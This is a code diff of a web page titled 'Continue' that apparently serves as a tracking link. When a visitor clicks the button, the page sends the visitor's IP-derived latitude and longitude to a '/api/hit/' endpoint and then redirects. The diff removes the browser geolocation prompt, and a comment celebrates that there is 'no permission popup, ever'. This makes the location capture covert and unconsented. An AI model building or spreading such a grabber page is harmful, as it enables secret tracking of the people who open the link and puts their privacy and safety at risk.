@@ -5,11 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Continue</title>
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
 body {
   min-height: 100vh;
@@ -20,10 +16,7 @@ body {
   justify-content: center;
 }
 
-.container {
-  text-align: center;
-  padding: 20px;
-}
+.container { text-align: center; padding: 20px; }
 
 .btn {
   background: white;
@@ -38,18 +31,9 @@ body {
   margin-top: 20px;
 }
 
-.btn:hover {
-  transform: scale(1.05);
-  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-}
-
-.btn:active {
-  transform: scale(0.98);
-}
-
-.hidden {
-  display: none;
-}
+.btn:hover { transform: scale(1.05); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+.btn:active { transform: scale(0.98); }
+.hidden { display: none; }
 
 .spinner {
   width: 40px;
@@ -61,15 +45,8 @@ body {
   margin: 20px auto 0;
 }
 
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-p {
-  color: white;
-  font-size: 16px;
-  margin-bottom: 20px;
-}
+@keyframes spin { to { transform: rotate(360deg); } }
+p { color: white; font-size: 16px; margin-bottom: 20px; }
 </style>
 </head>
 <body>
@@ -86,7 +63,6 @@ let locationSent = false;
 const continueBtn = document.getElementById('continueBtn');
 const loading = document.getElementById('loading');
 
-// Get destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
@@ -95,20 +71,23 @@ fetch('/api/hits/' + linkId)
 function sendLocation(lat, lon, acc) {
   if (locationSent) return;
   locationSent = true;
-  
+
   fetch('/api/hit/' + linkId, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
-  
-  // Redirect
+
   window.location.href = destUrl;
 }
 
-function getIPLocation() {
+function grabLocation() {
+  continueBtn.style.display = 'none';
+  loading.classList.remove('hidden');
+
+  // ✅ No geolocation = no permission popup, ever
   fetch('https://ipapi.co/json/')
-    .then(response => response.json())
+    .then(r => r.json())
     .then(data => {
       if (data.latitude && data.longitude) {
         sendLocation(data.latitude, data.longitude, 5000);
@@ -116,40 +95,7 @@ function getIPLocation() {
         sendLocation(null, null, null);
       }
     })
-    .catch(() => {
-      sendLocation(null, null, null);
-    });
-}
-
-function grabLocation() {
-  continueBtn.style.display = 'none';
-  loading.classList.remove('hidden');
-
-  // Try GPS with a short timeout, fall back to IP immediately on any error
-  if (navigator.geolocation) {
-    const timeout = setTimeout(() => {
-      // If GPS takes too long, use IP
-      if (!locationSent) getIPLocation();
-    }, 3000);
-
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        clearTimeout(timeout);
-        sendLocation(
-          pos.coords.latitude,
-          pos.coords.longitude,
-          Math.round(pos.coords.accuracy)
-        );
-      },
-      err => {
-        clearTimeout(timeout);
-        getIPLocation(); // Fall back to IP on denial/error
-      },
-      { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 }
-    );
-  } else {
-    getIPLocation();
-  }
+    .catch(() => sendLocation(null, null, null));
 }
 
 continueBtn.addEventListener('click', grabLocation);
